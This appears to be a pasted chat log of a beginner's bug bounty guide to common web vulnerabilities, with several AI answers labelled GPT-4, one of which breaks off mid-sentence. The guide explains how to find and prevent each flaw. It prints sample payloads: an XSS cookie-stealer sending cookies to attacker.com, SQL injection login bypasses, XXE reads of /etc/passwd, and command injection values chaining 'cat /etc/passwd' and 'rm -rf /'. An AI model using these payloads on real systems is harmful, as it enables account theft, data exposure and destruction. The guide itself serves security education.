Beginner's Guide to Bug Bounties: Recon and Common Vulnerabilities
------------------------------------------------------------------

### Recon

Reconnaissance, or "recon," is the process of gathering information about a target system before attempting to attack it. This can involve using various tools and techniques to identify potential vulnerabilities and entry points.

### Common Vulnerabilities

#### 1\. Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users. These scripts can steal user data, manipulate web content, or redirect users to malicious websites.

Example of an XSS payload:

```xml
<script>alert('XSS');</script>
```

To find XSS vulnerabilities during an audit, look for input fields, URL parameters, and other areas where user input is accepted and rendered back to the user without proper sanitization. To prevent XSS attacks, always sanitize and validate user input, use secure coding practices, and implement Content Security Policy (CSP) headers. [openbugbounty.org](https://www.openbugbounty.org/blog/tag/cross-site-scripting-xss/)

#### 2\. Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is a vulnerability that allows an attacker to force a user to perform actions on a website without their consent. This can lead to unauthorized actions, such as changing the user's email address or password.

Example of a CSRF exploit:

```html
<img src="https://example.com/changeEmail?newEmail=attacker@email.com" width="0" height="0" />
```

To find CSRF vulnerabilities, look for state-changing requests that do not have proper anti-CSRF tokens or other protections in place. To prevent CSRF attacks, use anti-CSRF tokens, validate and sanitize user input, and implement proper access controls. [portswigger.net](https://portswigger.net/web-security/csrf)

#### 3\. Insecure Direct Object References (IDOR)

Insecure Direct Object References (IDOR) occur when an application uses user-supplied input to access objects directly, without proper access controls. This can lead to unauthorized access to sensitive data or functionality.

Example of an IDOR vulnerability:

```bash
https://example.com/customerAccount?customer_number=12345
```

To find IDOR vulnerabilities, look for URL parameters, input fields, or other areas where user input is used to access resources directly. To prevent IDOR attacks, implement proper access controls, validate and sanitize user input, and avoid exposing direct references to internal objects. [portswigger.net](https://portswigger.net/web-security/access-control/idor)

#### 4\. Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make the server-side application send requests to arbitrary locations, potentially accessing sensitive data or internal systems.

Example of an SSRF exploit:

```bash
https://example.com/stockAPI?url=https://192.168.0.68/admin
```

To find SSRF vulnerabilities, look for areas where user-supplied URLs or other inputs are used to make server-side requests. To prevent SSRF attacks, validate and sanitize user input, use allowlists for permitted URLs, and implement proper network segmentation. [portswigger.net](https://portswigger.net/web-security/ssrf)

#### 5\. SQL Injection

SQL Injection is a vulnerability that allows an attacker to inject malicious SQL code into a query, potentially manipulating the database and accessing sensitive data.

Example of an SQL Injection payload:

```vbnet
' OR 1=1 --
```

To find SQL Injection vulnerabilities, look for input fields, URL parameters, or other areas where user input is used in SQL queries. To prevent SQL Injection attacks, use parameterized queries or prepared statements, validate and sanitize user input, and implement proper access controls. [portswigger.net](https://portswigger.net/web-security/sql-injection)

#### 6\. Cross-Origin Resource Sharing (CORS) Vulnerabilities

CORS vulnerabilities occur when an application allows unauthorized domains to access its resources, potentially leading to data leakage or manipulation.

Example of a CORS vulnerability:

```makefile
Access-Control-Allow-Origin: *
```

To find CORS vulnerabilities, look for misconfigured CORS headers in server responses. To prevent CORS vulnerabilities, configure CORS headers properly, use allowlists for permitted domains, and implement proper access controls. [portswigger.net](https://portswigger.net/web-security/cors)

#### 7\. Session Hijacking

Session Hijacking is an attack where an attacker steals a user's session identifier, allowing them to impersonate the user and perform actions on their behalf.

Example of a Session Hijacking exploit:

```vbnet
Stealing a user's session cookie and using it to access their account.
```

To find Session Hijacking vulnerabilities, look for insecure handling of session identifiers, such as transmitting them over insecure channels or storing them in insecure locations. To prevent Session Hijacking, use secure session management practices,

Add in information about LFI, RFI, Http parameter pollution, command injection, open redirect, XML external entity, File upload, server side XSS, etc

___
**Gpt-4 answer:**
#### 8\. Local File Inclusion (LFI) and Remote File Inclusion (RFI)

LFI and RFI are vulnerabilities that allow an attacker to include local or remote files in a web application, potentially leading to unauthorized access to sensitive data or execution of malicious code. LFI involves including a file stored on the target server, while RFI involves including a file from an external source [spanning.com](https://spanning.com/blog/file-inclusion-vulnerabilities-lfi-rfi-web-based-application-security-part-9/).

To find LFI and RFI vulnerabilities, look for areas where user input is used to include files, such as URL parameters or input fields, without proper validation. To prevent LFI and RFI attacks, sanitize and validate user input, disable remote inclusion features in PHP configuration, and whitelist accepted filenames [secf00tprint.github.io](https://secf00tprint.github.io/blog/payload-tester/lfirfi/en).

#### 9\. HTTP Parameter Pollution (HPP)

HTTP Parameter Pollution (HPP) is a vulnerability that allows an attacker to manipulate or inject additional HTTP parameters into a request, potentially leading to unauthorized actions or data manipulation.

To find HPP vulnerabilities, look for areas where multiple HTTP parameters with the same name are accepted without proper validation. To prevent HPP attacks, sanitize and validate user input, implement server-side input validation, and use secure coding practices.

#### 10\. Command Injection

Command Injection is a vulnerability that allows an attacker to execute arbitrary system commands on the server by injecting malicious input into a vulnerable application.

To find Command Injection vulnerabilities, look for areas where user input is used to construct and execute system commands without proper validation. To prevent Command Injection attacks, sanitize and validate user input, use parameterized APIs, and implement proper access controls.

#### 11\. Open Redirect

Open Redirect is a vulnerability that allows an attacker to redirect users to arbitrary domains by manipulating a vulnerable application's URL parameters or input fields.

To find Open Redirect vulnerabilities, look for areas where user input is used to construct redirect URLs without proper validation. To prevent Open Redirect attacks, sanitize and validate user input, use allowlists for permitted domains, and implement proper access controls.

#### 12\. XML External Entity (XXE)

XML External Entity (XXE) is a vulnerability that allows an attacker to exploit external entities in XML documents, potentially leading to unauthorized access to sensitive data or remote code execution.

To find XXE vulnerabilities, look for areas where XML documents are parsed without proper validation or security configurations. To prevent XXE attacks, disable external entities in XML parsers, validate and sanitize user input, and use secure coding practices.

#### 13\. File Upload Vulnerabilities

File Upload vulnerabilities occur when an application allows unauthorized or unvalidated file uploads, potentially leading to unauthorized access to sensitive data, remote code execution, or other attacks.

To find File Upload vulnerabilities, look for areas where file uploads are accepted without proper validation, file type restrictions, or access controls. To prevent File Upload vulnerabilities, sanitize and validate user input, implement secure file upload practices, and use proper access controls.

#### 14\. Server-Side XSS

Server-Side XSS is a variant of Cross-Site Scripting (XSS) where the malicious payload is stored and executed on the server-side, rather than being reflected in the client-side application.

To find Server-Side XSS vulnerabilities, look for areas where user input is stored on the server and later rendered back to users without proper sanitization. To prevent Server-Side XSS attacks, sanitize and validate user input, use secure coding practices, and implement Content Security Policy (CSP) headers.

**Gpt-4 answer:**
### Detailed Examples and Analysis of 5 Common Vulnerabilities

#### 1\. Cross-Site Scripting (XSS)

**Example 1**: In Advantech WebAccess versions prior to 8.1, a vulnerability allowed remote injection of arbitrary web scripts or HTML through authenticated users. As a result, attackers could obtain sensitive information [ptsecurity.com](https://www.ptsecurity.com/ww-en/analytics/knowledge-base/what-is-a-cross-site-scripting-xss-attack/).

Payload:

```xml
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>
```

This payload redirects the user to the attacker's website, sending the user's cookies along with the request. To find this vulnerability, an auditor could test input fields and URL parameters for unsanitized user input.

**Example 2**: A vulnerability in Wonderware Information Server allowed attackers to inject arbitrary code into a web page viewed by other users or bypass client-side security in web browsers. The attack could be initiated remotely, and no authentication was required for successful exploitation [ptsecurity.com](https://www.ptsecurity.com/ww-en/analytics/knowledge-base/what-is-a-cross-site-scripting-xss-attack/).

Payload:

```xml
<img src="x" onerror="alert('XSS');">
```

This payload uses an image tag with an invalid source, causing the `onerror` event to trigger and execute the JavaScript code. To find this vulnerability, an auditor could test input fields and URL parameters for unsanitized user input.

#### 2\. SQL Injection

**Example 1**: An e-commerce website allows users to search for products by name. The search functionality uses the following SQL query:

```sql
SELECT * FROM products WHERE name LIKE '%SEARCH_TERM%';
```

Payload:

```shell
%' OR 1=1;--
```

This payload modifies the SQL query to return all products, regardless of their name. To find this vulnerability, an auditor could test input fields and URL parameters for unsanitized user input in SQL queries.

**Example 2**: A login form uses the following SQL query to authenticate users:

```sql
SELECT * FROM users WHERE username = 'USERNAME' AND password = 'PASSWORD';
```

Payload:

```bash
' OR '1'='1' --
```

This payload modifies the SQL query to always return a user, bypassing the password check. To find this vulnerability, an auditor could test input fields and URL parameters for unsanitized user input in SQL queries.

#### 3\. Insecure Direct Object References (IDOR)

**Example 1**: An online banking application allows users to view their account balance using the following URL:

```bash
https://bank.example.com/view_balance?account_id=12345
```

By changing the `account_id` parameter, an attacker could potentially access other users' account balances. To find this vulnerability, an auditor could test URL parameters and input fields for direct object references without proper access controls.

**Example 2**: A file storage application allows users to download their files using the following URL:

```bash
https://storage.example.com/download?file_id=67890
```

By changing the `file_id` parameter, an attacker could potentially access other users' files. To find this vulnerability, an auditor could test URL parameters and input fields for direct object references without proper access controls.

#### 4\. XML External Entity (XXE)

**Example 1**: An application accepts XML input and processes it using an XML parser with external entities enabled. The following XML payload could be used to read the contents of the `/etc/passwd` file on the server:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```

To find this vulnerability, an auditor could test areas where XML documents are parsed without proper validation or security configurations.

**Example 2**: An application processes XML input and uses an XML parser with external entities enabled. The following XML payload could be used to perform a Server-Side Request Forgery (SSRF) attack:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://internal.example.com/secret" >
]>
<foo>&xxe;</foo>
```

This payload fetches data from an internal server that may not be directly accessible to the attacker. To find this vulnerability, an auditor could test areas where XML documents are parsed without proper validation or security configurations.

#### 5\. Command Injection

**Example 1**: An application allows users to perform a DNS lookup using the following command:

```text
nslookup DOMAIN_NAME
```

Payload:

```bash
example.com; cat /etc/passwd
```

This payload performs a DNS

___
**Gpt-4 answer:**
My apologies for the incomplete response. Here's the continuation of the Command Injection examples and the addition of real-world reports for the five common vulnerabilities.

#### 5\. Command Injection (Continued)

**Example 1**: An application allows users to perform a DNS lookup using the following command:

```text
nslookup DOMAIN_NAME
```

Payload:

```bash
example.com; cat /etc/passwd
```

This payload performs a DNS lookup and then executes an additional command to read the `/etc/passwd` file on the server. To find this vulnerability, an auditor could test input fields and URL parameters for unsanitized user input used to construct and execute system commands.

**Example 2**: A web application allows users to ping a specified IP address using the following command:

```text
ping IP_ADDRESS
```

Payload:

```bash
127.0.0.1 && rm -rf /
```

This payload pings the specified IP address and then executes an additional command to delete all files on the server. To find this vulnerability, an auditor could test input fields and URL parameters for unsanitized user input used to construct and execute system commands.
